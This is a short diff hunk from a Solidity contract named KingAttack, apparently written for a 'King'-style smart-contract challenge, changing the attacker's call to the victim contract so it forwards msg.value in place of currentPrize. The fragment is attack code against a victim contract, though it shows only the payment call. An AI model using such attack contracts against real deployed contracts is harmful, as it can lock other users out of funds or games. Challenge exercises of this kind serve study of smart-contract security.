@@ -23,7 +23,7 @@ contract KingAttack is Ownable {
 
         if (msg.value < currentPrize) revert();
 
-        (bool success, ) = victimContract.call{value: currentPrize}("");
+        (bool success, ) = victimContract.call{value: msg.value}("");
 
         if (!success) revert();
     }
